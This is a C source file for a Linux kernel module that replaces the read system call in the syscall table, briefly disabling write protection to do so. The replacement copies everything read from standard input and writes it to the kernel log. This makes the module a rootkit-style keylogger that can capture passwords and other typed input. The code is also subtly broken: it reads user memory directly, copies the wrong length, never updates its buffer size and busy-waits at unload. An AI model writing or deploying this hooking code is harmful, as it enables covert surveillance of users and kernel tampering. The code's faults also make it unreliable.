#include<linux/kernel.h>
#include<linux/syscalls.h>
#include<linux/unistd.h>
#include<linux/slab.h>
#include<linux/string.h>
#include<linux/list.h>
#include<linux/sched.h>
#include<linux/fs.h>
#include<linux/fdtable.h>
#include<linux/dcache.h>
#include<linux/hash.h>


#include "hooking.h"
#include "read_hooking.h"

ssize_t (*orig_sys_read)(int fd, void * buf, size_t count);
char * buffer;
int r_count=0;

static ssize_t my_read(int fd, void *buf, size_t count){
	static int buf_size = 0;
	ssize_t retVal;
	r_count++;
	retVal = orig_sys_read(fd, buf, count);
	if(fd == 0){ //stdin
		if(count >= buf_size){
			kfree(buffer);
			buffer = (char *) kmalloc(count+1, GFP_KERNEL);
		}
		if(buffer != NULL){
			strncpy(buffer, (char*)buf, count);
			buffer[count]='\0';
			printk(KERN_INFO "%s\n",buffer);
		}
	}
	r_count--;
	return retVal;
}
	
void hook_read(void ** syscall_table){
	disable_wp();
	orig_sys_read = syscall_table[__NR_read];
	syscall_table[__NR_read] = my_read;
	enable_wp();
}

void unhook_read(void ** syscall_table){
	disable_wp();
	syscall_table[__NR_read] = orig_sys_read;
	enable_wp();
  kfree(buffer);
  	while(r_count>0){// hack to unblock read
    		printk(KERN_INFO "\n");
  	}
}

